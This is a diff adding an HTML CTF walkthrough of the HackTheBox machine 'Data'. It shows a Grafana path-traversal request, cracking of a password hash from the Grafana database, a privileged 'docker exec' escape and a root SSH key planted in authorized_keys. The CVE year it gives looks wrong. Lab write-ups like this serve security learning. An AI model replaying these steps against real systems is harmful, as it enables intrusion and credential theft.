@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Data</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Data</p>
+        <p><strong>Difficulty:</strong> Easy</p>
+        <p><strong>OS:</strong> Linux</p>
+        <p><strong>Date Completed:</strong> 12-11-2025</p>
+        <p><strong>IP Address:</strong> 10.129.26.238</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Enumerating gave 2 ports that were accessible, one port had an outdated Grafana running on it which gave me an attack vector using directory traversal. After getting user flag there was a Docker command and exposed mount that I could abuse for container escape and eventually root.</p>
+
+    <h2>Enumeration</h2>
+
+    <h3>Nmap Scan</h3>
+    <pre><code>$ nmap 10.129.26.238 -sC -sV -O -T4</code></pre>
+
+    <p><strong>Results:</strong></p>
+    <pre><code>Port 22: SSH
+	Port 3000: ppp? (Later turned out to be Grafana)</code></pre>
+
+	<div class="img-placeholder">
+        <img src="d38ac445efad1eb3074ceb253f5c4d5e.png">
+    </div>
+
+    <h3>Web Enumeration</h3>
+    <p>After visiting the URL on port 3000 I immediately get greeted by a Grafana page with the version stated on the bottom.</p>
+
+    <div class="img-placeholder">
+        <img src="f39fbdd7e04ed8ab2f3cb40341377802.png">
+    </div>
+
+    <h2>Initial Foothold</h2>
+
+    <h3>Vulnerability Discovery</h3>
+    <p>Further research about this Grafana version shows this version is vulnerable to directory traversal. This means we can potentially read files that are on the host filesystem.</p>
+    <p><strong>CVE:</strong> CVE-2024-43798</p>
+
+    <h3>Exploitation</h3>
+    <p>Reading up on the CVE shows you can read files using the <code>..%2F</code> as path traversal.</p>
+    <p>I tried the following in Burp Suite:</p>
+
+    <pre><code>GET /public/plugins/alertlist/#/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd</code></pre>
+
+    <div class="img-placeholder">
+        <img src="26510d71d1e0d96ac8596056aadee79b.png">
+    </div>
+
+    <p>Researching where Grafana places its DB gave the following result: <code>/var/lib/grafana/grafana.db</code></p>
+
+    <div class="img-placeholder">
+        <img src="5739f0cbf967721ed6a288119635dd8a.png">
+    </div>
+
+    <p>Viewing the DB file showed an user called Boris with a long string which looks like a hash and 2 short strings attached to this long hash. After researching the Grafana documentation, it showed that Grafana stores its passwords in a different kind of hash (PBKDF2-HMAC-SHA256). I used a public available 'Grafana2Hashcat' Python script so the hash becomes crackable.</p>
+
+    <p><strong>Hashcat command</strong></p>
+    <pre><code>$ hashcat -m 10900 hash.txt rockyou.txt
+&lt;SNIP&gt;
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+&lt;/SNIP&gt;
+
+sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb8vkk1PjX1O1Hag=:<span class="redacted">&lt;REDACTED&gt;</span>
+
+&lt;SNIP&gt;
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
+Hash.Target......: sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0...O1Hag=
+Time.Started.....: Tue Jul 1 11:27:58 2025 (1 sec)
+Time.Estimated...: Tue Jul 1 11:27:59 2025 (0 secs)</code></pre>
+
+    <p>Hashcat cracked a password!!!</p>
+
+    <p>Lets use this password to try and get SSH access using the Boris account we found with the hash inside the Grafana DB.</p>
+
+    <p><strong>SSH command</strong></p>
+    <pre><code>ssh boris@10.129.26.238
+
+boris@10.129.26.238's password: <span class="redacted">&lt;REDACTED&gt;</span>
+
+boris@data:~$ cat user.txt</code></pre>
+
+    <p><strong>User Flag:</strong></p>
+    <pre><code>cat user.txt</code></pre>
+
+    <h2>Privilege Escalation</h2>
+
+    <h3>Enumeration</h3>
+    <p>While enumerating the target machine I found the following.</p>
+
+    <pre><code>boris@data:~$ sudo -l
+Matching Defaults entries for boris on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User boris may run the following commands on localhost:
+    (root) NOPASSWD: /snap/bin/docker exec *</code></pre>
+
+    <div class="img-placeholder">
+        <img src="4485f188741bd956c74ac6209583c56e.png">
+    </div>
+
+    <p>I also checked for mounted partitions on the host filesystem</p>
+
+    <p><strong>Mount command</strong></p>
+    <pre><code>boris@data:~$ mount
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
+/dev/sda1 on / type ext4 (rw,relatime)</code></pre>
+
+    <div class="img-placeholder">
+        <img src="c3c3dbfd07aea8418eb6db6b7b1649e2.png">
+    </div>
+
+    <h3>Exploitation</h3>
+    <p>After research I found the following privilege escalation path. The binary that I can run as sudo allows the flag <code>--privileged</code>. This flag is a misconfiguration which allows me to run commands as root, bypassing the Docker restrictions. Knowing this, lets try to get a root bash shell.</p>
+
+    <p><strong>Command</strong></p>
+    <pre><code>boris@data:~$ sudo docker exec -u root --privileged -it e6ff5b1cbc85 bash
+
+bash-5.1#</code></pre>
+
+    <p>We now have a root privilege shell by running the command <code>bash</code> as the user root in the container we have enumerated at the start (Grafana container).</p>
+
+    <p>Since we have a root shell, lets add my public SSH key to the host filesystem. We found that the container isolation has been broken by a misconfiguration. <code>/dev/sda1</code> has been mounted to <code>/mnt</code> which is a host filesystem partition.</p>
+
+    <pre><code>bash-5.1# mount /dev/sda1 /mnt
+
+bash-5.1# ls -la /mnt/root/root.txt
+
+-rw-r----- 1 root root 33 Jul 1 09:59 /mnt/root/root.txt</code></pre>
+
+    <p>Using this misconfiguration we can read the root flag on the host filesystem. Knowing the <code>/mnt</code> contains the entire filesystem we can upload our public SSH key to the authorized keys at <code>/mnt/root/.ssh/authorized_keys</code>.</p>
+
+    <pre><code>bash-5.1# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDfIAKnZAfZSbtAbkXiR5xu/mYRBTUvTYyBHrxT37YkC' > /mnt/root/.ssh/authorized_keys</code></pre>
+
+    <p>Now our SSH key is trusted we can login using root.</p>
+
+    <p><strong>Root Flag:</strong></p>
+    <pre><code>ssh root@10.129.26.238
+
+root@data:~#
+root@data:~# cat /root/root.txt</code></pre>
+
+    <h2>Tools Used</h2>
+    <ul>
+        <li>Nmap</li>
+        <li>Burp Suite</li>
+        <li>Hashcat</li>
+        <li>Grafana2Hashcat</li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
